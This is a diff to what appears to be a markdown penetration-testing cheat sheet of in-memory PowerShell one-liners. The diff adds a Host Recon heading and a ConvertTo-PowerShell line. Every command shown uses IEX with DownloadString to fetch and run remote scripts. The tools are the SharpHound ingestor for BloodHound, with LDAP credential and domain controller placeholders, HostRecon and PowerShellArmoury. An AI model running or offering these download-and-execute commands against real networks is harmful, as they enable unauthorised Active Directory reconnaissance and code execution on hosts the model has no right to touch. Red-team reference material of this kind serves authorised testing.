@@ -9,7 +9,6 @@ sudo chmod +x $(find /PATH/)
 ##### BloodHound ingestor trough PowerShell
 ~~~
 IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound -LdapUsername "Username" -LdapPassword "Password" -Domain "Domain" -DomainController DC-ip -CollectionMethods All -OutputDirectory "C:\TEMP\"
-~~~
 
 
 
@@ -45,10 +44,15 @@ IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.co
 
 ### Scripts - In Memory
 -----------------------
+#### Host Recon
 ~~~
-# Host Recon
 IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1');
 Invoke-HostRecon
+~~~
+
+#### ConvertTo-PowerShell
+~~~
+IEX (New-Object Net.Webclient).DownloadString('https://github.com/cfalta/PowerShellArmoury/raw/2d9bea5e1c10353186fe75ebc28c5e596247dca3/utilities/ConvertTo-Powershell.ps1');
 ~~~
 
 ##### Powerview
